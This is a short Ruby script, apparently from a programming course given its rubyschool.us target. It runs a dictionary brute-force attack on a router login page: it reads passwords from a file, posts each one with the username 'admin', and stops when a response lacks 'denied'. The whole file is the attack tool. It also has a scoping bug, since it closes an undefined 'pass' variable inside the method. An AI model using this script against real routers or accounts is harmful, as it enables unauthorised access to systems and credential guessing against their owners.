require 'net/http'
require 'uri'

def is_wrong_password? password

	uri = URI.parse 'http://rubyschool.us/router'
	response = Net::HTTP.post_form(uri, { :login => 'admin', :password => password}).body
	if !response.include?('denied')
		puts 'Access granted!'
		puts "Password : #{password}"
		pass.close
		exit
	else
		puts "Trying password : #{password}"
		puts "Access denied!\n"
	end
end

pass = File.open("passwords.txt", "r")
# output = File.open("size6passwords.txt", "w")
while line = pass.gets do
	line.strip!
	is_wrong_password? line
end
pass.close
# output.close

